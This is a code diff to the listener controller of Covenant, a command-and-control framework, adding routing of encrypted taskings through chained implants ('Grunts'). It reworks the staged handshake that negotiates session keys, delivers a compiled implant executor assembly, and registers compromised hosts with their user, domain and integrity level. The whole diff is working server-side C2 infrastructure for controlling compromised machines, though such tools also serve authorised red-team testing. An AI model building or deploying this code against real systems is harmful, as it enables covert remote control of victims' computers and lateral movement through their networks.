@@ -77,6 +77,36 @@ namespace Covenant.Controllers
             return String.Format(this.Profile.HttpPostResponse, "");
         }
 
+        private Models.Grunts.GruntEncryptedMessage CreateMessageForGrunt(API.Models.Grunt grunt, API.Models.Grunt targetGrunt, GruntTaskingMessage taskingMessage)
+        {
+            return this.CreateMessageForGrunt(grunt, targetGrunt, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
+        }
+
+        private Models.Grunts.GruntEncryptedMessage CreateMessageForGrunt(API.Models.Grunt grunt, API.Models.Grunt targetGrunt, string taskingMessage)
+        {
+            return this.CreateMessageForGrunt(grunt, targetGrunt, Common.CovenantEncoding.GetBytes(taskingMessage));
+        }
+
+        private Models.Grunts.GruntEncryptedMessage CreateMessageForGrunt(API.Models.Grunt grunt, API.Models.Grunt targetGrunt, byte[] message)
+        {
+            List<string> path = this.CovenantClient.ApiGruntsByIdPathByTidGet(grunt.Id ?? default, targetGrunt.Id ?? default).ToList();
+            path.Reverse();
+            Models.Grunts.GruntEncryptedMessage finalMessage = null;
+            Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType messageType = Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Tasking;
+            foreach (string guid in path)
+            {
+                API.Models.Grunt thisGrunt = this.CovenantClient.ApiGruntsGuidByGuidGet(guid);
+                finalMessage = Covenant.Models.Grunts.GruntEncryptedMessage.Create(
+                    Covenant.Models.Grunts.Grunt.Create(thisGrunt),
+                    message,
+                    messageType
+                );
+                message = Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
+                messageType = Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Routing;
+            }
+            return finalMessage;
+        }
+
         [AllowAnonymous]
 		[HttpGet]
 		public ActionResult<string> Get()
@@ -90,8 +120,9 @@ namespace Covenant.Controllers
                 return Ok();
 			}
             gruntModel.LastCheckIn = DateTime.Now.ToString();
-            CovenantClient.ApiGruntsPut(gruntModel);
-            GruntTasking gruntTasking = CovenantClient.ApiGruntsByIdTaskingsGet(gruntModel.Id ?? default).FirstOrDefault(GT => GT.Status == GruntTaskingStatus.Uninitialized);
+            this.CovenantClient.ApiGruntsPut(gruntModel);
+            GruntTasking gruntTasking = this.CovenantClient.ApiGruntsByIdTaskingsSearchUninitializedGet(gruntModel.Id ?? default)
+                                                      .FirstOrDefault();
             if (gruntTasking == null)
             {
                 // No GruntTasking assigned. Respond with empty template, 
@@ -109,11 +140,8 @@ namespace Covenant.Controllers
             gruntTasking.Status = GruntTaskingStatus.Tasked;
             CovenantClient.ApiGruntsByIdTaskingsByTasknamePut(gruntTasking.GruntId ?? default, gruntTasking.Name, gruntTasking);
 
-            string responseTasking = JsonConvert.SerializeObject(gruntTasking.TaskingMessage);
-            var message = Covenant.Models.Grunts.GruntEncryptedMessage.Create(
-                Covenant.Models.Grunts.Grunt.Create(gruntModel),
-                Common.CovenantEncoding.GetBytes(responseTasking)
-            );
+            API.Models.Grunt targetGruntModel = this.CovenantClient.ApiGruntsByIdGet(gruntTasking.GruntId ?? default);
+            Models.Grunts.GruntEncryptedMessage message = this.CreateMessageForGrunt(gruntModel, targetGruntModel, gruntTasking.TaskingMessage);
             // Transform response
             string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
             // Format transformed response
@@ -141,18 +169,34 @@ namespace Covenant.Controllers
                     // Request not formatted correctly. May not be legitimate Grunt request, respond NotFound
                     return NotFound();
                 }
-                switch (message.Type)
+                string cookie = this.GetCookie();
+                API.Models.Grunt egressGrunt = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.CookieAuthKey == cookie);
+                API.Models.Grunt targetGrunt = null;
+                try
                 {
-                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Stage0:
-                        return this.PostStage0(message);
-                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Stage1:
-                        return this.PostStage1(message);
-                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Stage2:
-                        return this.PostStage2(message);
-                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Register:
-                        return this.RegisterGrunt(message);
-                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.PostTask:
-                        return this.PostTask(message);
+                    targetGrunt = this.CovenantClient.ApiGruntsGuidByGuidGet(message.GUID);
+                }
+                catch (Microsoft.Rest.HttpOperationException)
+                {
+                    if (targetGrunt == null && message.GUID.Length == 20)
+                    {
+                        targetGrunt = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.OriginalServerGuid == message.GUID.Substring(0, 10));
+                        return this.PostStage0(egressGrunt, targetGrunt, message);
+                    }
+                }
+
+                switch ((Covenant.Models.Grunts.Grunt.GruntStatus)targetGrunt.Status)
+                {
+                    case Covenant.Models.Grunts.Grunt.GruntStatus.Uninitialized:
+                        return this.PostStage0(egressGrunt, targetGrunt, message);
+                    case Covenant.Models.Grunts.Grunt.GruntStatus.Stage0:
+                        return this.PostStage1(egressGrunt, targetGrunt, message);
+                    case Covenant.Models.Grunts.Grunt.GruntStatus.Stage1:
+                        return this.PostStage2(egressGrunt, targetGrunt, message);
+                    case Covenant.Models.Grunts.Grunt.GruntStatus.Stage2:
+                        return this.RegisterGrunt(egressGrunt, targetGrunt, message);
+                    case Covenant.Models.Grunts.Grunt.GruntStatus.Active:
+                        return this.PostTask(egressGrunt, targetGrunt, message);
                     default:
                         return NotFound();
                 }
@@ -160,25 +204,29 @@ namespace Covenant.Controllers
         }
         
         // post task
-		private ActionResult PostTask(Covenant.Models.Grunts.GruntEncryptedMessage outputMessage)
+		private ActionResult PostTask(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage outputMessage)
         {
             string cookie = this.GetCookie();
-            API.Models.Grunt gruntModel = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.CookieAuthKey == cookie);
-            if (gruntModel == null || gruntModel.Status != GruntStatus.Active)
+            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Active || egressGrunt.CookieAuthKey != cookie)
             {
                 // Invalid CookieAuthKey. May not be legitimate Grunt request, respond NotFound
                 return NotFound();
             }
 
 			string TaskName = outputMessage.Meta;
-            GruntTasking gruntTasking = CovenantClient.ApiGruntsByIdTaskingsByTasknameGet(gruntModel.Id ?? default, TaskName);
-            if (gruntTasking == null || gruntModel.Id != gruntTasking.GruntId)
+            if (string.IsNullOrWhiteSpace(TaskName))
+            {
+                // Invalid task response. This happens on post-register write
+                return NotFound();
+            }
+            GruntTasking gruntTasking = CovenantClient.ApiGruntsByIdTaskingsByTasknameGet(targetGrunt.Id ?? default, TaskName);
+            if (gruntTasking == null || targetGrunt.Id != gruntTasking.GruntId)
             {
 				// Invalid taskname. May not be legitimate Grunt request, respond NotFound
 				return NotFound();
             }
 
-            var realGrunt = Covenant.Models.Grunts.Grunt.Create(gruntModel);
+            var realGrunt = Covenant.Models.Grunts.Grunt.Create(targetGrunt);
             if (realGrunt == null || realGrunt.Status != Covenant.Models.Grunts.Grunt.GruntStatus.Active)
             {
                 // Invalid Grunt. May not be legitimate Grunt request, respond NotFound
@@ -194,8 +242,8 @@ namespace Covenant.Controllers
             gruntTasking.Status = GruntTaskingStatus.Completed;
             if (gruntTasking.Type == GruntTaskingType.Kill)
             {
-                gruntModel.Status = GruntStatus.Killed;
-                CovenantClient.ApiGruntsPut(gruntModel);
+                targetGrunt.Status = GruntStatus.Killed;
+                CovenantClient.ApiGruntsPut(targetGrunt);
             }
             CovenantClient.ApiGruntsByIdTaskingsByTasknamePut(gruntTasking.GruntId ?? default, gruntTasking.Name, gruntTasking);
 
@@ -236,89 +284,104 @@ namespace Covenant.Controllers
             }
 			return Ok();
         }
-        
-        // stage0
-		private ActionResult PostStage0(Covenant.Models.Grunts.GruntEncryptedMessage gruntStage0Response)
+
+		private ActionResult PostStage0(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage gruntStage0Response)
         {
-            // Check if this Grunt ID is already active
-            API.Models.Grunt savedGrunt = CovenantClient.ApiGruntsByIdGet(gruntStage0Response.Id);
-            if (savedGrunt == null)
+            if(targetGrunt == null || !gruntStage0Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)))
             {
-				// Always return NotFound, don't give away unnecessary info
+                // Always return NotFound, don't give away unnecessary info
                 return NotFound();
             }
-            if(!gruntStage0Response.VerifyHMAC(Convert.FromBase64String(savedGrunt.GruntSharedSecretPassword)))
+            Covenant.Models.Grunts.Grunt realTargetGrunt = null;
+            string guid = gruntStage0Response.GUID;
+            if (guid.Length == 20) { guid = guid.Substring(10); }
+            if (targetGrunt.Status != GruntStatus.Uninitialized)
             {
-				// Always return NotFound, don't give away unnecessary info
-                return NotFound();
-            }
-            Covenant.Models.Grunts.Grunt realGrunt = null;
-            if (savedGrunt.Status != GruntStatus.Uninitialized)
-            {
-                savedGrunt.Status = GruntStatus.Stage0;
+                targetGrunt.Status = GruntStatus.Stage0;
+                targetGrunt.Guid = guid;
                 // We create a new Grunt if this one is not uninitialized
                 API.Models.Grunt tempModel = new API.Models.Grunt
                 {
-                    Status = savedGrunt.Status,
-                    ListenerId = savedGrunt.ListenerId,
-                    CovenantIPAddress = savedGrunt.CovenantIPAddress,
-                    GruntSharedSecretPassword = savedGrunt.GruntSharedSecretPassword,
-                    Delay = savedGrunt.Delay, Jitter = savedGrunt.Jitter,
-                    ConnectAttempts = savedGrunt.ConnectAttempts,
-                    DotNetFrameworkVersion = savedGrunt.DotNetFrameworkVersion
+                    Guid = targetGrunt.Guid,
+                    Status = targetGrunt.Status,
+                    ListenerId = targetGrunt.ListenerId,
+                    CovenantIPAddress = targetGrunt.CovenantIPAddress,
+                    GruntSharedSecretPassword = targetGrunt.GruntSharedSecretPassword,
+                    UsePipes = targetGrunt.UsePipes,
+                    PipeName = targetGrunt.PipeName,
+                    Delay = targetGrunt.Delay, Jitter = targetGrunt.Jitter,
+                    ConnectAttempts = targetGrunt.ConnectAttempts,
+                    DotNetFrameworkVersion = targetGrunt.DotNetFrameworkVersion
                 };
                 API.Models.Grunt tempGrunt = CovenantClient.ApiGruntsPost(tempModel);
-                realGrunt = Covenant.Models.Grunts.Grunt.Create(tempGrunt);
+                realTargetGrunt = Covenant.Models.Grunts.Grunt.Create(tempGrunt);
             }
             else
             {
-                savedGrunt.Status = GruntStatus.Stage0;
-                API.Models.Grunt tempGrunt = CovenantClient.ApiGruntsPut(savedGrunt);
-                realGrunt = Covenant.Models.Grunts.Grunt.Create(tempGrunt);
+                targetGrunt.Status = GruntStatus.Stage0;
+                targetGrunt.Guid = guid;
+                API.Models.Grunt tempGrunt = CovenantClient.ApiGruntsPut(targetGrunt);
+                realTargetGrunt = Covenant.Models.Grunts.Grunt.Create(tempGrunt);
+            }
+            if (egressGrunt == null)
+            {
+                egressGrunt = realTargetGrunt.ToModel();
+            }
+            else
+            {
+                // Add this as Child grunt to Grunt that connects it
+                List<GruntTasking> taskings = this.CovenantClient.ApiGrunttaskingsGet().ToList();
+                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
+                GruntTasking connectTasking = taskings.Where(GT => GT.Type == GruntTaskingType.Connect && GT.Status == GruntTaskingStatus.Tasked).Reverse().FirstOrDefault();
+                if (connectTasking == null)
+                {
+                    return NotFound();
+                }
+                API.Models.Grunt taskedGrunt = this.CovenantClient.ApiGruntsByIdGet(connectTasking.GruntId ?? default);
+                if (taskedGrunt == null)
+                {
+                    return NotFound();
+                }
+                taskedGrunt.ChildGrunts = String.Join(",", taskedGrunt.ChildGrunts.Split(",").Append(realTargetGrunt.GUID).ToList());
+                this.CovenantClient.ApiGruntsPut(taskedGrunt);
+                connectTasking.Status = GruntTaskingStatus.Completed;
+                this.CovenantClient.ApiGruntsByIdTaskingsByTasknamePut(taskedGrunt.Id ?? default, connectTasking.Name, connectTasking);
             }
 
             // EncryptedMessage is the RSA Public Key
-            realGrunt.GruntRSAPublicKey = Convert.ToBase64String(Encrypt.Utilities.AesDecrypt(
+            realTargetGrunt.GruntRSAPublicKey = Convert.ToBase64String(Encrypt.Utilities.AesDecrypt(
                 gruntStage0Response,
-                Convert.FromBase64String(realGrunt.GruntSharedSecretPassword)
+                Convert.FromBase64String(realTargetGrunt.GruntSharedSecretPassword)
             ));
             // Generate negotiated session key
             Aes newAesKey = Aes.Create();
             newAesKey.GenerateKey();
-            realGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
-            CovenantClient.ApiGruntsPut(realGrunt.ToModel());
+            realTargetGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
+            CovenantClient.ApiGruntsPut(realTargetGrunt.ToModel());
 
-            byte[] rsaEncryptedBytes = realGrunt.RSAEncrypt(Convert.FromBase64String(realGrunt.GruntNegotiatedSessionKey));
+            byte[] rsaEncryptedBytes = realTargetGrunt.RSAEncrypt(Convert.FromBase64String(realTargetGrunt.GruntNegotiatedSessionKey));
 
-            Covenant.Models.Grunts.GruntEncryptedMessage message = Covenant.Models.Grunts.GruntEncryptedMessage.Create(
-                realGrunt,
-                rsaEncryptedBytes,
-                Convert.FromBase64String(realGrunt.GruntSharedSecretPassword)
-            );
-            string Stage0Response = message.Id + "," + message.Name + "," + message.IV + "," + message.EncryptedMessage + "," + message.HMAC;
-            // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
+            Covenant.Models.Grunts.GruntEncryptedMessage message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, rsaEncryptedBytes);
             // Transform response
-            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(Stage0Response));
+            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
             // Format transformed response
             string response = String.Format(this.Profile.HttpPostResponse, transformed);
+            // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
             return Ok(response);
         }
 
-		private ActionResult PostStage1(Covenant.Models.Grunts.GruntEncryptedMessage gruntStage1Response)
+		private ActionResult PostStage1(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage gruntStage1Response)
         {
-            // Check if this Grunt ID is already active
-            API.Models.Grunt gruntModel = CovenantClient.ApiGruntsByIdGet(gruntStage1Response.Id);
-            if (gruntModel == null || gruntModel.Status != GruntStatus.Stage0)
+            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage0 || !gruntStage1Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
             {
 				// Always return NotFound, don't give away unnecessary info
                 return NotFound();
             }
-            if (!gruntStage1Response.VerifyHMAC(Convert.FromBase64String(gruntModel.GruntNegotiatedSessionKey)))
+            if (egressGrunt == null)
             {
-				// Always return NotFound, don't give away unnecessary info
-                return NotFound();
+                egressGrunt = targetGrunt;
             }
-            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(gruntModel);
+            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(targetGrunt);
             byte[] challenge1 = realGrunt.SessionDecrypt(gruntStage1Response);
             byte[] challenge2 = new byte[4];
             using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
@@ -327,41 +390,34 @@ namespace Covenant.Controllers
             }
             // Save challenge to compare on response
             realGrunt.GruntChallenge = Convert.ToBase64String(challenge2);
-
-            Covenant.Models.Grunts.GruntEncryptedMessage message = Covenant.Models.Grunts.GruntEncryptedMessage.Create(realGrunt, challenge1.Concat(challenge2).ToArray());
-
-            string Stage1Response = message.IV + "," + message.EncryptedMessage + "," + message.HMAC;
-            // Stage1Response: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
-
             realGrunt.Status = Covenant.Models.Grunts.Grunt.GruntStatus.Stage1;
             CovenantClient.ApiGruntsPut(realGrunt.ToModel());
 
+            Covenant.Models.Grunts.GruntEncryptedMessage message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, challenge1.Concat(challenge2).ToArray());
             // Transform response
-            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(Stage1Response));
+            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
             // Format transformed response
             string response = String.Format(this.Profile.HttpPostResponse, transformed);
+            // Stage1Response: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
             return Ok(response);
         }
 
-        public ActionResult PostStage2(Covenant.Models.Grunts.GruntEncryptedMessage gruntStage2Response)
+        public ActionResult PostStage2(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage gruntStage2Response)
         {
-            // Check if this Grunt ID is already active
-            API.Models.Grunt gruntModel = CovenantClient.ApiGruntsByIdGet(gruntStage2Response.Id);
-            if (gruntModel == null || gruntModel.Status != GruntStatus.Stage1)
+            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage1 || !gruntStage2Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
             {
 				// Always return NotFound, don't give away unnecessary info
                 return NotFound();
             }
-            if (!gruntStage2Response.VerifyHMAC(Convert.FromBase64String(gruntModel.GruntNegotiatedSessionKey)))
+            if (egressGrunt == null)
             {
-				// Always return NotFound, don't give away unnecessary info
-                return NotFound();
+                egressGrunt = targetGrunt;
             }
-            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(gruntModel);
+            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(targetGrunt);
             byte[] challenge2test = realGrunt.SessionDecrypt(gruntStage2Response);
             if (realGrunt.GruntChallenge != Convert.ToBase64String(challenge2test))
             {
-				// Always return NotFound, don't give away unnecessary info
+                // Always return NotFound, don't give away unnecessary info
                 return NotFound();
             }
             realGrunt.Status = Covenant.Models.Grunts.Grunt.GruntStatus.Stage2;
@@ -370,44 +426,41 @@ namespace Covenant.Controllers
             API.Models.HttpProfile profileModel = this.CovenantClient.ApiListenersByIdProfileGet(realGrunt.ListenerId);
             var realListener = Covenant.Models.Listeners.HttpListener.Create(listenerModel);
             string GruntExecutorAssembly = realListener.CompileGruntExecutorCode(realGrunt, Covenant.Models.Listeners.HttpProfile.Create(profileModel));
-            var message = Covenant.Models.Grunts.GruntEncryptedMessage.Create(realGrunt, Convert.FromBase64String(GruntExecutorAssembly));
 
-            string Stage2Response = message.IV + "," + message.EncryptedMessage + "," + message.HMAC;
-            // returns: "Base64(IV),Base64(AES(GruntExecutorAssembly)),Base64(HMAC)"
+            Covenant.Models.Grunts.GruntEncryptedMessage message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, Convert.FromBase64String(GruntExecutorAssembly));
             // Transform response
-            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(Stage2Response));
+            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
             // Format transformed response
             string response = String.Format(this.Profile.HttpPostResponse, transformed);
+            // returns: "Base64(IV),Base64(AES(GruntExecutorAssembly)),Base64(HMAC)"
             return Ok(response);
         }
 
-		private ActionResult RegisterGrunt(Covenant.Models.Grunts.GruntEncryptedMessage gruntMessage)
+		private ActionResult RegisterGrunt(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage gruntMessage)
 		{
-            API.Models.Grunt gruntModel = CovenantClient.ApiGruntsByIdGet(gruntMessage.Id);
-			if (gruntModel == null || gruntModel.Status != GruntStatus.Stage2)
+            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage2 || !gruntMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
 			{
 				// Always return NotFound, don't give away unnecessary info
 				return NotFound();
 			}
-			if (!gruntMessage.VerifyHMAC(Convert.FromBase64String(gruntModel.GruntNegotiatedSessionKey)))
-			{
-				// Always return NotFound, don't give away unnecessary info
-				return NotFound();
-			}
-			Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(gruntModel);
+            if (egressGrunt == null)
+            {
+                egressGrunt = targetGrunt;
+            }
+            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(targetGrunt);
 			string message = Common.CovenantEncoding.GetString(realGrunt.SessionDecrypt(gruntMessage));
 			// todo: try/catch on deserialize?
 			Covenant.Models.Grunts.Grunt grunt = JsonConvert.DeserializeObject<Covenant.Models.Grunts.Grunt>(message);
 
-			gruntModel.IpAddress = grunt.IPAddress;
-			gruntModel.OperatingSystem = grunt.OperatingSystem;
-			gruntModel.UserDomainName = grunt.UserDomainName;
-			gruntModel.UserName = grunt.UserName;
-			gruntModel.Status = GruntStatus.Active;
-			gruntModel.Integrity = (API.Models.IntegrityLevel)Enum.Parse(typeof(API.Models.IntegrityLevel), grunt.Integrity.ToString());
-			gruntModel.Process = grunt.Process;
+			targetGrunt.IpAddress = grunt.IPAddress;
+			targetGrunt.OperatingSystem = grunt.OperatingSystem;
+			targetGrunt.UserDomainName = grunt.UserDomainName;
+			targetGrunt.UserName = grunt.UserName;
+			targetGrunt.Status = GruntStatus.Active;
+			targetGrunt.Integrity = (API.Models.IntegrityLevel)Enum.Parse(typeof(API.Models.IntegrityLevel), grunt.Integrity.ToString());
+			targetGrunt.Process = grunt.Process;
 
-			CovenantClient.ApiGruntsPut(gruntModel);
+			CovenantClient.ApiGruntsPut(targetGrunt);
 			CovenantClient.ApiEventsPost(new EventModel
 			{
 				Message = "Grunt: " + grunt.Name + " from: " + grunt.IPAddress + " has been activated!",
@@ -415,9 +468,14 @@ namespace Covenant.Controllers
 				Context = "*"
 			});
 
-            var responseMessage = Covenant.Models.Grunts.GruntEncryptedMessage.Create(
-                Covenant.Models.Grunts.Grunt.Create(gruntModel), Common.CovenantEncoding.GetBytes(gruntModel.CookieAuthKey)
-            );
+            GruntTaskingMessage tasking = new GruntTaskingMessage
+            {
+                Message = targetGrunt.CookieAuthKey,
+                Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
+                Type = GruntTaskingType.Set
+            };
+
+            Models.Grunts.GruntEncryptedMessage responseMessage = this.CreateMessageForGrunt(egressGrunt, targetGrunt, tasking);
             // Transform response
             string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
             // Format transformed response
